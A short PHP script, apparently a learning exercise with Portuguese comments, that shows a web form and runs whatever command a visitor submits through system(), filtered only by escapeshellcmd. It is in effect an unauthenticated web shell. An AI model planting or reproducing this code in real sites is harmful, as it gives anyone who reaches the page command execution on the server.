<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $cmd = escapeshellcmd($_POST["cmd"]);

    var_dump($cmd);

    echo "<pre>";

    $comendo =  system($cmd, $retorno);

    echo "</pre>";

    //system — Execute an external program and display the output
    //escapeshellcmd — escapa metacaracteres shell
}
?>

<form method="post">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>
</form>

